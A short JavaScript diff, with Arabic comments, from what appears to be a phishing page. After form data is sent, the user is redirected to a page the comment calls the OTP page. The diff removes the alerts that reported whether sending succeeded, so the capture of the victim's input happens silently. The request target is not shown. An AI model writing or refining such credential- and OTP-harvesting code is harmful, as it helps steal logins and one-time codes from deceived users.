@@ -64,13 +64,10 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert("تم الإرسال بنجاح!");
                     window.location.href = "eror.html";  // بعد إرسال البيانات، توجيه المستخدم إلى صفحة OTP
                 } else {
-                    alert("فشل الإرسال: " + data.description);
                 }
             })
-            .catch(error => alert("حدث خطأ: " + error));
         }
 
         // دالة لإعادة تعيين النموذج إذا تم الضغط على إلغاء
